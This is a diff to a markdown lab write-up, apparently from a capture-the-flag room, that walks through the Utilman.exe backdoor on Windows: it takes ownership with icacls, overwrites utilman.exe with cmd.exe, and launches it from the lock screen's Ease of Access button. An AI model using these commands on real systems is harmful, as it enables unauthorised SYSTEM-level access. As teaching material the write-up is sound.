@@ -43,16 +43,15 @@ SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by us
 
 ```log
 C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
-Processed File: Utilman.exe
 ```
 
 
 <br/>
 
 - Replacing `Utilman.exe` with a copy of `cmd.exe`
-- To trigger `Utilman` we click **Ease of Access**  Button from the **Lock Screen.**
 
 ```log
 C:\Windows\System32\> copy cmd.exe utilman.exe
-        1 file(s) copied.
 ```
+
+- To trigger `Utilman` we click **Ease of Access**  Button from the **Lock Screen.**
